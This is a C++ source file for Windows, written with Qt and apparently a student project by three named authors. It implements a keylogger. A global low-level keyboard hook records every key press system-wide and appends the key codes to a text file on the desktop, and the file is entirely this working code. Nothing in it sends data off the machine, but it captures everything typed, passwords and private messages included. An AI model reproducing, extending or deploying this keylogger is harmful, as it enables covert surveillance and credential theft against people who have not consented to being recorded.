/**
 * @author  Dhivya Govindrajan
 * @author  Ashish Pandit
 * @author  Sushant Murdeshwar
 *
 * Windows API Reference: https://msdn.microsoft.com/en-us/library/windows/desktop/ms632589(v=vs.85).aspx
 */

#include <QtCore/QCoreApplication>
#include <QDebug>
#include <QTime>
#include <QChar>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>


#pragma comment(lib,"user32.lib") // user32.lib library used to manipulate the windows UI; calling through the SDk
HHOOK hhook;  // creates windows hook


using namespace std;
fstream textfile;
LRESULT WINAPI KeyboardProc(int, WPARAM, LPARAM);

/*
 * Keyboard Proc
 * LPARAM - contains information about the keyboard message
 * WPARAM - WM_KEYDOWN (key pressed), WM_KEYUP (key released)
 */
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam){
    static int count =0;
    DWORD shift, ctrl, menu, capital;
    int key_vcode;
    textfile.open("C:/Users/Sushant/Desktop/keystrokes.txt",fstream::app); //opens a file streasm and appends the key code
    if (wparam == WM_KEYDOWN){ // if the key pressed (KEYDOWN) is true, enter the loop
        PKBDLLHOOKSTRUCT keyvalue = (PKBDLLHOOKSTRUCT)lparam;
        shift=GetAsyncKeyState(VK_SHIFT);  // key status of the shift key
        ctrl=GetAsyncKeyState(VK_CONTROL); // key status of the ctrl key
        menu=GetAsyncKeyState(VK_MENU); // key status of the alt key
        capital=GetAsyncKeyState(VK_CAPITAL); // key status of the capital key
        key_vcode=keyvalue->vkCode; // gets the windows vkcode value
        textfile << key_vcode << endl;
        count++;
    }

    textfile.close();
    return CallNextHookEx(hhook, nCode, wparam, lparam); //passes the hook control to the next hook procedure
}


/*
 * main function
 */
int main(int argc, char *argv[]){
    QCoreApplication a(argc, argv);
    textfile.open("C:/Users/Sushant/Desktop/keystrokes.txt",fstream::app);
    textfile<<"----------------------------------------------------------- \n";
    textfile.close();
    hhook=SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0); // installs and defines the hook procedure for the keyboard events
    return a.exec();
}
